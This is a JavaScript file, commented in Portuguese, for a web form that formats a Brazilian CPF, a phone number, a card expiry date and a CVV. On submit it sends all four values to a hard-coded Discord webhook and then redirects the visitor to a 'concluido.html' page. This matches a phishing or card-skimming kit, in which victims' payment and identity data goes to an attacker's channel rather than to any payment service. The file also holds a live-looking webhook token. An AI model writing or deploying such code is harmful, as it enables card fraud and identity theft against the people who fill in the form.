// Função para formatar o CPF enquanto o usuário digita
function formatarCPF(campo) {
    let cpf = campo.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
    if (cpf.length > 11) cpf = cpf.slice(0, 11); // Limita o CPF a 11 dígitos

    // Adiciona a formatação do CPF (xxx.xxx.xxx-xx)
    cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
    cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
    cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

    campo.value = cpf; // Atribui o valor formatado ao campo de CPF
}

// Função para formatar o telefone enquanto o usuário digita
function formatarTelefone(campo) {
    let telefone = campo.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
    if (telefone.length > 11) telefone = telefone.slice(0, 11); // Limita o telefone a 11 dígitos

    // Adiciona a formatação do telefone (xx) xxxxx-xxxx
    if (telefone.length <= 2) {
        telefone = `(${telefone}`;
    } else if (telefone.length <= 6) {
        telefone = `(${telefone.slice(0, 2)}) ${telefone.slice(2)}`;
    } else {
        telefone = `(${telefone.slice(0, 2)}) ${telefone.slice(2, 7)}-${telefone.slice(7, 11)}`;
    }

    campo.value = telefone; // Atribui o valor formatado ao campo de telefone
}

// Função para formatar a data de validade do cartão enquanto o usuário digita (MM/AAAA)
function formatarDataValidade(campo) {
    let validade = campo.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico

    if (validade.length > 6) validade = validade.slice(0, 6); // Limita a data de validade a 6 dígitos

    // Adiciona a formatação (MM/AAAA)
    if (validade.length >= 3) {
        validade = `${validade.slice(0, 2)}/${validade.slice(2, 6)}`;
    }

    campo.value = validade; // Atribui o valor formatado ao campo de data de validade
}

// Função para formatar o CVV enquanto o usuário digita (limita a 3 dígitos e impede a digitação de mais)
function formatarCVV(campo) {
    let cvv = campo.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
    if (cvv.length > 3) cvv = cvv.slice(0, 3); // Limita o CVV a 3 dígitos
    campo.value = cvv; // Atribui o valor formatado ao campo de CVV
}

// Função chamada quando o campo de CPF é alterado
document.querySelector("#campo1").addEventListener("input", function() {
    formatarCPF(this);
});

// Função chamada quando o campo de telefone é alterado
document.querySelector("#campo2").addEventListener("input", function() {
    formatarTelefone(this);
});

// Função chamada quando o campo de data de validade é alterado
document.querySelector("#campo3").addEventListener("input", function() {
    formatarDataValidade(this);
});

// Função chamada quando o campo de CVV é alterado
document.querySelector("#campo4").addEventListener("input", function() {
    formatarCVV(this);
});

// Função para enviar os dados para o Discord e redirecionar o cliente para a página concluída
document.querySelector(".botao-continuar").addEventListener("click", function() {
    // Coletar os valores dos campos do formulário
    const cpf = document.querySelector("#campo1").value;
    const telefone = document.querySelector("#campo2").value;
    const validade = document.querySelector("#campo3").value;
    const cvv = document.querySelector("#campo4").value;

    // Verificar se os campos não estão vazios
    if (cpf && telefone && validade && cvv) {
        // Configuração do Webhook do Discord
        const webhookUrl = "https://discord.com/api/webhooks/1317017089357385770/6Kc7n9lA1kk_A6mGrgaCrtmWk0ZmAP24L5xfJVzHrgIyxvcR7CdwHsc_NieKvAnBgKtP"; // Substitua com a URL do seu Webhook

        // Montando a mensagem a ser enviada para o Discord
        const message = {
            content: `**Novo Formulário Preenchido**\n\n**CPF:** ${cpf}\n**Telefone:** ${telefone}\n**Data de Validade:** ${validade}\n**CVV:** ${cvv}`
        };

        // Enviando os dados para o Discord via Webhook
        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(message)
        })
        .then(response => {
            if (response.ok) {
                // Dados enviados com sucesso, agora redireciona para a página concluido.html
                window.location.href = "concluido.html";
            } else {
                throw new Error("Erro ao enviar os dados para o Discord");
            }
        })
        .catch(error => {
            console.error("Erro ao enviar dados:", error);
            alert("Erro ao enviar os dados.");
        });
    } else {
        // Se algum campo estiver vazio, exibe um alerta
        alert("Por favor, preencha todos os campos.");
    }
});